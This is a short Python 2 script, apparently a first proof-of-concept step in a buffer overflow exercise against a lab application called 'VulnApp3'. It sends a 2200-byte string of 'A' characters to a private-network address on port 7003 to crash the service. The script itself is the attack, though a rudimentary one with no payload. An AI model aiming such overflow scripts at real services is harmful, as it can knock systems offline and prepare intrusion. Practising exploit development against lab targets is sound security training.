#!/usr/bin/python
import socket
import time

try:
  print "[*] Strating buffer overflow attack against VulnApp3: poc-1"
  time.sleep(1)
  print "[*] Setup the buffer"
  mybuffer = "A" * 2200

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  s.connect(("192.168.128.10", 7003))
  s.send(mybuffer)
  s.close()

  print "[*] Flowding finish!"
  time.sleep(1)
except:
  print "[*] Error occur could not connect!"


